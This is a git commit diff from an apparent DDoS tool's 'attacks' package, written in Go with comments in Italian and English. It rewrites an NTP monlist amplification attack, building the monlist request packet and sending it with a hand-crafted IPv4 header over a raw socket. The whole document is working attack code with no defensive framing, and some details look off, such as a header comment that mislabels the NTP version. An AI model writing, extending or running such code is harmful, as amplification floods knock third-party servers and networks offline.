c9077703a36ac13bbc4a96b2887df102339a4254
b1g-d0g <b1g-d0g2024@proton.me>
2024-09-09 10:06:42 -0400

    NTP sources

--- attacks/ntp_amplification.go
+++ attacks/ntp_amplification.go
@@ -1,18 +1,20 @@
 package attacks
 
 import (
-	"net"
-
+	"fmt"
 	"cyberstorm/core"
+	"net"
 )
 
-func SendNTPAmplification(rawSocket core.RawSocket, srcIp, dstIp net.IP, dstPort uint16) error {
-	// Build the NTP monlist request
-	ntpRequest, err := core.BuildNTPMonlistRequest()
-	if err != nil {
-		return err
-	}
+// SendNTPAmplification invia una richiesta NTP MONLIST all'indirizzo di destinazione
+func SendNTPAmplification(rawSocket core.RawSocket, dstIp net.IP, dstPort uint16) error {
+	packet := core.BuildNTPMonlistRequest()
+	ipv4Header := core.GetIPV4Header(dstIp, dstIp, len(packet), 17) // Protocol 17 for UDP
+	ipv4HeaderBytes, _ := ipv4Header.Marshal()
 
-	// Send the NTP monlist request via raw socket
-	return core.SendNTPMonlist(rawSocket, srcIp, dstIp, ntpRequest)
+	data := append(ipv4HeaderBytes, packet...)
+	if err := rawSocket.Send(data); err != nil {
+		return fmt.Errorf("send data to: %w", err)
+	}
+	return nil
 }
--- core/ntp.go
+++ core/ntp.go
@@ -1,38 +1,20 @@
 package core
 
 import (
-	"bytes"
-	"encoding/binary"
-	"net"
+	//"math/rand"
 )
 
-// BuildNTPMonlistRequest builds the NTP monlist request to exploit vulnerable NTP servers.
-func BuildNTPMonlistRequest() ([]byte, error) {
-	ntpRequest := make([]byte, 48)
+// BuildNTPMonlistRequest costruisce una richiesta NTP Monlist (per l'amplificazione).
+func BuildNTPMonlistRequest() []byte {
+	// Crea un pacchetto NTP di dimensione 48 byte
+	packet := make([]byte, 48)
 
-	// Control Message, Mode 3 (Client) + Opcode 7 (MON_GETLIST_1)
-	ntpRequest[0] = 0x17
-	ntpRequest[1] = 0x02 // Sequence number
-	ntpRequest[2] = 0x00 // Status
-	ntpRequest[3] = 0x31 // Status (part 2)
-	ntpRequest[4] = 0x00 // Association ID (most significant byte)
-	ntpRequest[5] = 0x00 // Association ID (least significant byte)
+	// Imposta i primi 1 byte per indicare il tipo di pacchetto e la versione NTP
+	packet[0] = 0x17 // LI=0, VN=4, Mode=3 (Client)
 
-	// Fill the rest of the request with zeros
-	for i := 6; i < len(ntpRequest); i++ {
-		ntpRequest[i] = 0x00
-	}
+	// Opzioni e campi extra per la richiesta MONLIST
+	// Usualmente, il payload non è modificato per la richiesta MONLIST
+	// La struttura del pacchetto è fissa a 48 byte per una richiesta NTP standard
 
-	buf := new(bytes.Buffer)
-	err := binary.Write(buf, binary.BigEndian, ntpRequest)
-	if err != nil {
-		return nil, err
-	}
-
-	return buf.Bytes(), nil
-}
-
-// SendNTPMonlist sends the NTP monlist request via UDP to the destination.
-func SendNTPMonlist(rawSocket RawSocket, srcIp, dstIp net.IP, data []byte) error {
-	return SendPacket(rawSocket, srcIp, dstIp, 17, data) // 17 is the protocol number for UDP
+	return packet
 }
